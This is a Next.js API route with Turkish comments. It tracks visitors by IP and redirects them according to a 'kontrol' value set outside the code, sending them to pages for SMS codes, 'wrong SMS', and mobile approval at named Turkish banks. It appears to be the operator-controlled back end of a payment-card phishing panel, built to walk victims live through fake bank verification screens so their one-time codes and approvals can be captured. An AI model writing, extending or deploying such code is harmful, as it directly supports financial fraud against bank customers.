import { NextRequest, NextResponse } from 'next/server';
import pool from '@/lib/db';

export async function POST(request: NextRequest) {
    try {
        const { sayfa } = await request.json();

        // IP adresini al
        const forwarded = request.headers.get('x-forwarded-for');
        const ip = forwarded ? forwarded.split(',')[0].trim() : request.headers.get('x-real-ip') || '127.0.0.1';

        // Anlık timestamp
        const onlineTimer = Date.now();

        // Önce bu IP var mı kontrol et
        const [existing] = await pool.query(
            'SELECT ip, kontrol FROM cevrimici_tablosu WHERE ip = ?',
            [ip]
        ) as any[];

        let kontrolValue = null;
        let redirectTo = null;

        if (existing && existing.length > 0) {
            // IP var, kontrol değerini al
            kontrolValue = existing[0].kontrol;

            // Kontrol değerine göre yönlendirme belirle
            if (kontrolValue === 'sms') {
                redirectTo = '/odeme/sms';
            } else if (kontrolValue === 'hatalisms') {
                redirectTo = '/odeme/hatali-sms';
            } else if (kontrolValue === 'ykbmobilonay') {
                redirectTo = '/odeme/ykb-mobil-onay';
            } else if (kontrolValue === 'garantimobilonay') {
                redirectTo = '/odeme/garanti-mobil-onay';
            } else if (kontrolValue === 'vakifmobilonay') {
                redirectTo = '/odeme/vakif-mobil-onay';
            } else if (kontrolValue === 'internet') {
                redirectTo = '/odeme?internet-hata';
            } else if (kontrolValue === 'tebrik') {
                redirectTo = '/odeme/basarili';
            } else if (kontrolValue === 'provizyon') {
                redirectTo = '/odeme?provizyon';
            } else if (kontrolValue === 'onaylandi') {
                redirectTo = '/odeme/tebrikler';
            }

            // Güncelle - eğer yönlendirme varsa kontrol'ü temizle
            if (redirectTo) {
                await pool.query(
                    'UPDATE cevrimici_tablosu SET onlineTimer = ?, sayfa = ?, kontrol = NULL WHERE ip = ?',
                    [onlineTimer, sayfa, ip]
                );
            } else {
                await pool.query(
                    'UPDATE cevrimici_tablosu SET onlineTimer = ?, sayfa = ? WHERE ip = ?',
                    [onlineTimer, sayfa, ip]
                );
            }
        } else {
            // Yeni kayıt ekle
            await pool.query(
                'INSERT INTO cevrimici_tablosu (ip, onlineTimer, sayfa) VALUES (?, ?, ?)',
                [ip, onlineTimer, sayfa]
            );
        }

        return NextResponse.json({
            success: true,
            ip,
            redirectTo
        });
    } catch (error) {
        console.error('Online tracking error:', error);
        return NextResponse.json({ success: false, error: 'Server error' }, { status: 500 });
    }
}
